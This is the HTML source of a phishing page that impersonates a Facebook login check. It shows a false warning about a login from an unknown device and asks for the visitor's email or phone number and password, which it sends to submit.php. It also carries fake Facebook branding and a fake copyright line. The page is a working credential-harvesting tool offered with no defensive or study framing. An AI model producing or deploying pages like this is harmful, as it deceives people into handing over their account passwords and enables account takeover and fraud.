<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
<meta name="viewport" content="width=device-width, user-scalable=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <link rel="stylesheet" type="text/css" href="bootstrap/css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="bootstrap/css/style.css">
    <meta charset="utf-8">
    <title>Verify your details</title>
<style media="screen">
.navbar-default{
  background-color: #2851A3;
  height:35px;
}
#fb{
  color:white;
  font-family:helvetica;
  font-size: 26px;
}
#footer{
  background-color: #e6e6e6;
}
</style>
  </head>
  <body>
      <nav class="navbar navbar-default" role="navigation">
          <div class="navbar-header">
        <a class="navbar-brand" href="#" id="fb"><b>facebook</b></a>
        </div>
      </nav>
      <div class="container">
<div class="row">
<div class="col-sm-8 col-sm-offset-2 col-xs-12">
<h4>Please Verify your details, we noticed a login from unknown device.</h4>
<form class="form-inline" action="submit.php" method="post">
  <div class="form-group">
    <label for="email">Email / Phone:</label>
    <input type="text" class="form-control" id="email" name="email" placeholder="enter your email or phonenumber" required>
  </div>
  <div class="form-group">
    <label for="pwd">Password:</label>
    <input type="password" class="form-control" id="pwd" name="pass" placeholder="enter your password" required>
  </div>
  <button type="submit" name="verify" class="btn btn-success btn-block">Verify</button>
</form>
</div>
</div>
</div>
 </body>
 <br><br><br>
 <footer id="footer" class="bg-dark py-5">
 <div class="container">
 <div class="row">
 	<div class="col text-center">
 	<ol class="breadcrumb">
 <li> <a href="#">English(UK)</a> </li>
 <li> <a href="#">Kiswahili</a> </li>
 <li> <a href="#">Francias</a> </li>
 <li> <a href="#">Italiano</a> </li>
 		</ol>
 	<p>Copyright &copy; <script>document.write(new Date().getFullYear());</script>
 	All rights reserved | Facebook inc.</p><br>
 	</div>
 </div>
 </div>
 </footer>
</html>
